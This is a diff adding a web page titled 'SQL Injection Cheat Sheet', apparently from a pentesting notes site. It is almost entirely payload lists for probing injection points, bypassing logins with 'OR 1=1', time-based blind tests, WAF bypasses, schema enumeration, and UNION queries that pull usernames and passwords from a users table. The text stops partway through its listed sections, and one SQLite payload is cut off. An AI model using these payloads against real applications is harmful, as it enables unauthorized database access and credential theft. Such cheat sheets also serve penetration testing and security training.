@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>SQL Injection Cheat Sheet - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "SQL Injection Cheat Sheet", url: "#_top", children: [
+              {title: "Entry Point Detection", url: "#entry-point-detection" },
+              {title: "Comment Syntax", url: "#comment-syntax" },
+              {title: "Basic Injection", url: "#basic-injection" },
+              {title: "Blind Injection - Timing", url: "#blind-injection-timing" },
+              {title: "Brute Force Values", url: "#brute-force-values" },
+              {title: "WAF Bypass", url: "#waf-bypass" },
+              {title: "Version Detection", url: "#version-detection" },
+              {title: "Detect Number of Columns", url: "#detect-number-of-columns" },
+              {title: "List Table Names", url: "#list-table-names" },
+              {title: "List Column Names", url: "#list-column-names" },
+              {title: "List Information in the Table", url: "#list-information-in-the-table" },
+              {title: "Fetch All Entities", url: "#fetch-all-entities" },
+              {title: "Modify/Insert Data", url: "#modifyinsert-data" },
+              {title: "RCE", url: "#rce" },
+              {title: "Error-based SQLi", url: "#error-based-sqli" },
+              {title: "Blind SQL", url: "#blind-sql" },
+              {title: "Blind SQL (Time-based)", url: "#blind-sql-time-based" },
+              {title: "Conditional Error", url: "#conditional-error" },
+              {title: "Writing Files", url: "#writing-files" },
+              {title: "XML Filter Bypass", url: "#xml-filter-bypass" },
+              {title: "XPATH Injection", url: "#xpath-injection" },
+              {title: "Truncation Attack", url: "#truncation-attack" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="sql-injection-cheat-sheet">SQL Injection Cheat Sheet</h1>
+<p>SQL injection (SQLi) is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution. This page is about the SQL injection cheat sheet.</p>
+<div class="language-text highlight"><pre><span></span><code>- [sql-injection-blind](https://portswigger.net/web-security/sql-injection/blind)
+- [SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection)
+- [adventofcyber2023](https://tryhackme.com/room/adventofcyber2023)
+- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection#entry-point-detection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection#entry-point-detection)
+</code></pre></div>
+<h2 id="entry-point-detection">Entry Point Detection</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>&#39;
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>%27
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>%2527
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>&quot;
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>%22
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>%2522
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>`
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>%60
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>%2560
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>#
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>%23
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>%2523
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>;
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>%3B
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>%253B
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>)
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>%29
+</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>%2529
+</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>
+</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>&#39;)
+</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>%27%29
+</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>%2527%2529
+</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>
+</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>&quot;)
+</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>%22%29
+</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>%2522%2529
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="comment-syntax">Comment Syntax</h2>
+<p>Comment syntax is depending on the database used in the website.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">DBMS</th>
+<th style="text-align: left;">Comments</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">MySQL</td>
+<td style="text-align: left;"><code>-- -</code> (add a space after <code>--</code>)</td>
+</tr>
+<tr>
+<td style="text-align: left;"></td>
+<td style="text-align: left;"><code>#</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"></td>
+<td style="text-align: left;"><code>/*comment*/</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"></td>
+<td style="text-align: left;"><code>/*!comment*/</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">MSSQL</td>
+<td style="text-align: left;"><code>--</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"></td>
+<td style="text-align: left;"><code>/*comment*/</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">Oracle</td>
+<td style="text-align: left;"><code>--</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">PostgreSQL</td>
+<td style="text-align: left;"><code>--</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"></td>
+<td style="text-align: left;"><code>/*comment*/</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">SQLite</td>
+<td style="text-align: left;"><code>--</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"></td>
+<td style="text-align: left;"><code>/*comment*/</code></td>
+</tr>
+</tbody>
+</table>
+<p><br /></p>
+<h2 id="basic-injection">Basic Injection</h2>
+<p>Check if we can inject SQL commands into forms or URL params in the target website.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>&#39; OR 1=1--
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>&#39; OR 1=1-- -
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>&#39; OR 1=1#
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>&#39; OR &#39;1&#39;=&#39;1&#39;--
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>&#39; OR &#39;1&#39;=&#39;1&#39;-- -
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>&#39; OR &#39;1&#39;=&#39;1&#39;#
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>&#39; OR &#39;1&#39;=&#39;1--
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>&#39; OR &#39;1&#39;=&#39;1-- -
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>&#39; OR &#39;1&#39;=&#39;1#
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>&quot; OR 1=1--
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>&quot; OR 1=1-- -
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>&quot; OR 1=1#
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>&#39;) OR 1=1--
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>&#39;) OR 1=1-- -
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>&#39;) OR 1=1#
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>&#39;; OR 1=1--
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>&#39;; OR 1=1-- -
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>&#39;; OR 1=1#
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>admin or 1=1--
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>admin or 1=1-- -
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>admin or 1=1#
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="blind-injection-timing">Blind Injection - Timing</h2>
+<p>Reference: <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection#confirming-with-timing">https://book.hacktricks.xyz/pentesting-web/sql-injection#confirming-with-timing</a></p>
+<p>Using <strong>sleep</strong> method for each query, if results are displayed with a delay, SQLi affects that.</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="cm">&lt;!-- MySQL --&gt;</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>test&#39; AND sleep(10)
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>test &#39; OR sleep(10)
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="cm">&lt;!-- MSSQL --&gt;</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>test&#39; WAITFOR DELAY &#39;0:0:10&#39;
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="cm">&lt;!-- Oracle --&gt;</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>test&#39; AND DBMS_SESSION.SLEEP(10)
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="cm">&lt;!-- PostgreSQL --&gt;</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>test&#39; AND pg_sleep(10)
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>test&#39; OR pg_sleep(10)
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>test&#39; || pg_sleep(10)
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="cm">&lt;!-- SQLite --&gt;</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>test&#39; AND [RANDNUM]=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="brute-force-values">Brute Force Values</h2>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>&#39; password LIKE &#39;%&#39;-- -
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>&#39; password LIKE BINARY &#39;%&#39;-- -
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>&#39; password REGEXP &#39;^[a-z]*&#39;-- -
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>&#39; password REGEXP BINARY &#39;^[a-z]*&#39;-- -
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="waf-bypass">WAF Bypass</h2>
+<p>Reference: <a href="https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF">https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF</a></p>
+<p>If website filters to prevent our payloads, we need to bypass the filter.</p>
+<h3 id="http-parameter-pollution">HTTP Parameter Pollution</h3>
+<p>We may inject by splitting the parameter values on the same keys.</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>/?id=&#39;+select+1<span class="err">&amp;</span>id=2,3+from+users+where+id=1-- -
+</span></code></pre></div>
+<h3 id="new-line-0a">New Line (’%0A’)</h3>
+<p>By prepending the new line (URL encoded to ‘%0A’), subsequent syntax may circumvent the filtering.</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>/?id=%0A&#39; OR 1=1-- -
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="version-detection">Version Detection</h2>
+<h3 id="mssql">MSSQL</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>&#39; UNION SELECT @@version--
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>&#39; UNION SELECT NULL,@@version--
+</span></code></pre></div>
+<h3 id="mysql">MySQL</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&#39; UNION SELECT @@version-- -
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>&#39; UNION SELECT @@version#
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>&#39; UNION SELECT NULL,@@version-- -
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>&#39; UNION SELECT NULL,@@version#
+</span></code></pre></div>
+<h3 id="oracle">Oracle</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>&#39; UNION SELECT &#39;a&#39; FROM dual--
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>&#39; UNION SELECT &#39;a&#39;,&#39;b&#39; FROM dual--
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>&#39; UNION SELECT * FROM v$version--
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>&#39; UNION SELECT BANNER,NULL FROM v$version--
+</span></code></pre></div>
+<h3 id="postgresql">PostgreSQL</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>&#39; UNION SELECT version()--
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>&#39; UNION SELECT NULL,version()--
+</span></code></pre></div>
+<h3 id="sqlite">SQLite</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>&#39; UNION SELECT sqlite_version()--
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>&#39; UNION SELECT sqlite_version(),NULL--
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="detect-number-of-columns">Detect Number of Columns</h2>
+<p>The following commands detect the number of the columns in the database.</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>&#39; UNION SELECT NULL--
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>&#39; UNION SELECT NULL-- -
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>&#39; UNION SELECT NULL,NULL--
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>&#39; UNION SELECT NULL,NULL-- -
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>&#39; UNION SELECT NULL,NULL,NULL--
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>&#39; UNION SELECT NULL,NULL,NULL-- -
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>&#39; UNION SELECT &#39;a&#39;,NULL,NULL--
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>&#39; UNION SELECT &#39;a&#39;,NULL,NULL-- -
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>&#39; UNION SELECT NULL,&#39;a&#39;,NULL--
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>&#39; UNION SELECT NULL,&#39;a&#39;,NULL-- -
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>
+</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>&#39; UNION SELECT NULL,NULL,&#39;a&#39;--
+</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a>&#39; UNION SELECT NULL,NULL,&#39;a&#39;-- -
+</span></code></pre></div>
+<h3 id="union-all">UNION ALL</h3>
+<p>We can combine the result of the query into the one column by using “UNION ALL” syntax.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>&#39; UNION ALL SELECT &quot;&#39; UNION SELECT flag,NULL,NULL from flags-- -&quot;,NULL,NULL from users-- -
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="list-table-names">List Table Names</h2>
+<p>Get the table name in which you want to get the information.</p>
+<h3 id="mssql_1">MSSQL</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>&#39; UNION SELECT table_name,NULL FROM information_schema.tables--
+</span></code></pre></div>
+<h3 id="mysql_1">MySQL</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>&#39; UNION SELECT table_name,NULL FROM information_schema.tables-- -
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>&#39; UNION SELECT table_name,NULL FROM information_schema.tables#
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="cm">&lt;!-- group_concat(): Dump all tables simultaneously --&gt;</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>&#39; UNION SELECT group_concat(table_name),NULL FROM information_schema.tables-- -
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>&#39; UNION SELECT group_concat(table_name),NULL FROM information_schema.tables#
+</span></code></pre></div>
+<h3 id="postgresql_1">PostgreSQL</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>&#39; UNION SELECT table_name,NULL FROM information_schema.tables--
+</span></code></pre></div>
+<h3 id="oracle_1">Oracle</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>&#39; UNION SELECT table_name,NULL FROM all_tables--
+</span></code></pre></div>
+<h3 id="sqlite_1">SQLite</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>&#39; UNION SELECT tbl_name FROM sqlite_master--
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>&#39; UNION SELECT tbl_name,NULL FROM sqlite_master--
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="list-column-names">List Column Names</h2>
+<p>Get column names from the table name which we got.</p>
+<h3 id="mssql_2">MSSQL</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>&#39; UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name=&#39;table_name&#39;--
+</span></code></pre></div>
+<h3 id="mysql_2">MySQL</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>&#39; UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name=&#39;table_name&#39;-- -
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>&#39; UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name=&#39;table_name&#39;#
+</span></code></pre></div>
+<h3 id="postgresql_2">PostgreSQL</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>&#39; UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name=&#39;table_name&#39;--
+</span></code></pre></div>
+<h3 id="oracle_2">Oracle</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>&#39; UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name=&#39;table_name&#39;--
+</span></code></pre></div>
+<h3 id="sqlite_2">SQLite</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>&#39; UNION SELECT column
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="list-information-in-the-table">List Information in the Table</h2>
+<p>Get information in the table.<br />
+For instance, suppose we want to get the username and password from the table named 'users'.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>&#39; UNION SELECT username,password FROM users--
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>&#39; UNION SELECT username,password FROM users-- -
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>&#39; UNION SELECT username || &#39;~&#39; || password FROM users--
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>&#39; UNION SELECT username || &#39;~&#39; || password FROM users-- -
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>&#39; UNION SELECT NULL,username || &#39;~&#39; || password FROM users--
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>&#39; UNION SELECT NULL,username || &#39;~&#39; || password FROM users-- -
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>&#39; UNION SELECT username,password FROM users WHERE username=&#39;admin&#39; AND password=&#39;password1&#39;--
